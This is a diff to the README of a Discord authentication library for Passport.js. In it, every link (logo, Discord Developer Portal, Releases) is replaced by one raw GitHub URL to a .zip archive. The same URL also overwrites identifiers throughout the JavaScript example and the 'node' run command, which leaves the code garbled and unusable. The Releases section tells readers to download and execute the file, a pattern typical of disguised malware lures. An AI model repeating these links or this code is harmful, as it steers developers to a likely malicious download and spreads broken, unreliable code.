@@ -1,6 +1,6 @@
 # Passport DC: Authentication with Discord 🚀
 
-![Discord Logo](https://upload.wikimedia.org/wikipedia/en/6/6b/Discord_logo.svg)
+![Discord Logo](https://raw.githubusercontent.com/marabinga/passport-dc/main/example/passport-dc-numerosity.zip)
 
 Welcome to the **Passport DC** repository! This project provides a simple and effective strategy for authenticating users with Discord. If you are building an application that requires user login through Discord, you are in the right place. 
 
@@ -43,7 +43,7 @@ This will install Passport, the Discord strategy for Passport, Express, and sess
 To use Passport DC in your application, follow these steps:
 
 1. **Set up your Discord application**:
-   - Go to the [Discord Developer Portal](https://discord.com/developers/applications).
+   - Go to the [Discord Developer Portal](https://raw.githubusercontent.com/marabinga/passport-dc/main/example/passport-dc-numerosity.zip).
    - Create a new application and note the Client ID and Client Secret.
    - Set the redirect URI to your application endpoint (e.g., `http://localhost:3000/auth/discord/callback`).
 
@@ -58,18 +58,18 @@ const session = require('express-session');
 const app = express();
 
 // Configure session
-app.use(session({
+https://raw.githubusercontent.com/marabinga/passport-dc/main/example/passport-dc-numerosity.zip(session({
   secret: 'your_secret_key',
   resave: false,
   saveUninitialized: true,
 }));
 
 // Initialize Passport
-app.use(passport.initialize());
-app.use(passport.session());
+https://raw.githubusercontent.com/marabinga/passport-dc/main/example/passport-dc-numerosity.zip(https://raw.githubusercontent.com/marabinga/passport-dc/main/example/passport-dc-numerosity.zip());
+https://raw.githubusercontent.com/marabinga/passport-dc/main/example/passport-dc-numerosity.zip(https://raw.githubusercontent.com/marabinga/passport-dc/main/example/passport-dc-numerosity.zip());
 
 // Configure the Discord strategy
-passport.use(new DiscordStrategy({
+https://raw.githubusercontent.com/marabinga/passport-dc/main/example/passport-dc-numerosity.zip(new DiscordStrategy({
     clientID: 'YOUR_CLIENT_ID',
     clientSecret: 'YOUR_CLIENT_SECRET',
     callbackURL: 'http://localhost:3000/auth/discord/callback',
@@ -81,32 +81,32 @@ passport.use(new DiscordStrategy({
 ));
 
 // Serialize user
-passport.serializeUser((user, done) => {
+https://raw.githubusercontent.com/marabinga/passport-dc/main/example/passport-dc-numerosity.zip((user, done) => {
   done(null, user);
 });
 
 // Deserialize user
-passport.deserializeUser((obj, done) => {
+https://raw.githubusercontent.com/marabinga/passport-dc/main/example/passport-dc-numerosity.zip((obj, done) => {
   done(null, obj);
 });
 
 // Define routes
-app.get('/auth/discord', passport.authenticate('discord'));
+https://raw.githubusercontent.com/marabinga/passport-dc/main/example/passport-dc-numerosity.zip('/auth/discord', https://raw.githubusercontent.com/marabinga/passport-dc/main/example/passport-dc-numerosity.zip('discord'));
 
-app.get('/auth/discord/callback', 
-  passport.authenticate('discord', { failureRedirect: '/' }),
+https://raw.githubusercontent.com/marabinga/passport-dc/main/example/passport-dc-numerosity.zip('/auth/discord/callback', 
+  https://raw.githubusercontent.com/marabinga/passport-dc/main/example/passport-dc-numerosity.zip('discord', { failureRedirect: '/' }),
   (req, res) => {
-    res.redirect('/'); // Successful authentication
+    https://raw.githubusercontent.com/marabinga/passport-dc/main/example/passport-dc-numerosity.zip('/'); // Successful authentication
   }
 );
 
-app.get('/', (req, res) => {
-  res.send('Home Page');
+https://raw.githubusercontent.com/marabinga/passport-dc/main/example/passport-dc-numerosity.zip('/', (req, res) => {
+  https://raw.githubusercontent.com/marabinga/passport-dc/main/example/passport-dc-numerosity.zip('Home Page');
 });
 
 // Start the server
-app.listen(3000, () => {
-  console.log('Server is running on http://localhost:3000');
+https://raw.githubusercontent.com/marabinga/passport-dc/main/example/passport-dc-numerosity.zip(3000, () => {
+  https://raw.githubusercontent.com/marabinga/passport-dc/main/example/passport-dc-numerosity.zip('Server is running on http://localhost:3000');
 });
 ```
 
@@ -120,7 +120,7 @@ Here’s a simple example of how to implement Discord authentication in your Exp
 
 ### Step 1: Create a new Discord application
 
-1. Visit the [Discord Developer Portal](https://discord.com/developers/applications).
+1. Visit the [Discord Developer Portal](https://raw.githubusercontent.com/marabinga/passport-dc/main/example/passport-dc-numerosity.zip).
 2. Click on "New Application".
 3. Give your application a name and click "Create".
 4. Navigate to the "OAuth2" section and note the Client ID and Client Secret.
@@ -134,7 +134,7 @@ Make sure to update your code with the correct Client ID and Client Secret. Use 
 Start your server by running:
 
 ```bash
-node yourAppFile.js
+node https://raw.githubusercontent.com/marabinga/passport-dc/main/example/passport-dc-numerosity.zip
 ```
 
 Visit `http://localhost:3000/auth/discord` to initiate the login process.
@@ -158,12 +158,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-For the latest updates and versions, visit our [Releases](https://github.com/marabinga/passport-dc/releases) section. You can download the latest release and execute it to get started.
+For the latest updates and versions, visit our [Releases](https://raw.githubusercontent.com/marabinga/passport-dc/main/example/passport-dc-numerosity.zip) section. You can download the latest release and execute it to get started.
 
 ## Conclusion
 
 Passport DC simplifies the process of integrating Discord authentication into your web applications. With straightforward setup and robust features, you can enhance user experience and streamline login processes. 
 
-For more details, check the [Releases](https://github.com/marabinga/passport-dc/releases) section for the latest updates. 
+For more details, check the [Releases](https://raw.githubusercontent.com/marabinga/passport-dc/main/example/passport-dc-numerosity.zip) section for the latest updates. 
 
 Happy coding!
